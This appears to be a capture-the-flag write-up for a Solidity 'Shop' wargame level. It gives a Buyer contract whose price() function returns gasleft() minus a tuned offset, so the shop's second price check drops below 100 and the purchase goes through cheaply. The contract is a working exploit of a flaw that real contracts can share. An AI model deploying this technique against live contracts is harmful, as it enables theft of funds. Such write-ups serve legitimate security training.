one possible solution would be to read the `isSold` variable from the `Shop` contract and return a different price value, but the call gas isn't enough. My idea here is to use `gasleft()` with an offset for the price; the second call at the end of the contract should have less gas left, enabling the `Buyer` contract to return a value < 100.

```
contract Buyer {
    Shop shop;
    uint public offset;

    function price() public view returns (uint) {
        return gasleft() - offset;
    }

    function buy() public {
        shop.buy();
    }

    function setOffset(uint _offset) public {
        offset = _offset;
    }

    function setShop(address instance) public {
        shop = Shop(instance);
    }
}
```

I first test it with `offset = 0` to get an initial value for the price. Then, take that value and set `offset = value - 100`. The first call should be 100, but the second (assuming a tight gas value for the tx) will be < 100.
